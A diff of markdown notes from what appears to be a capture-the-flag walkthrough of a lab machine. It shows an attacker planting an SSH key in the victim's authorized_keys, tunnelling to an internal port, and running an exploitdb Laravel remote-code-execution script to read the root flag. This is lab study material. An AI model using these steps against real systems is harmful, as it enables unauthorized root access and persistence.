@@ -87,14 +87,14 @@ Does NOT WORK::
 ##**SSH::**##
 ```
 attacker: ssh-keygen -t rsa -C "random comment"
-attacker: ${cat id_rsa.pub}
+attacker: ${cat id_rsa.pub} :: "AAAA.....root@kali"
 victim ~/.ssh/: echo ${cat id_rsa.pub} >> authorized_keys
 attacker:ssh -L 8000:127.0.0.1:8000 strapi@10.10.11.105 :: see![rev_tunnel](Screenshots/horizontall_ssh_rev_tunnel.png)
 searchsploit laravel:: /usr/share/exploitdb/exploits/webapps/php/49424.py
 ```
 W/ ssh_rev_tunnel 127.0.0.1:8000 is now accessible. 
 
-attacker: 'python3 ./49424.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log 'cat /root/root.txt''
+`attacker: 'python3 ./49424.py http://127.0.0.1:8000 /home/developer/myproject/storage/logs/laravel.log 'cat /root/root.txt'`
 root:: 2d171f3a6561a8f1db0e27b8d3be6546 see ![path_diff](Screenshots/horizontall_path_script_change_phpggc.png)
 ---
 **References::**
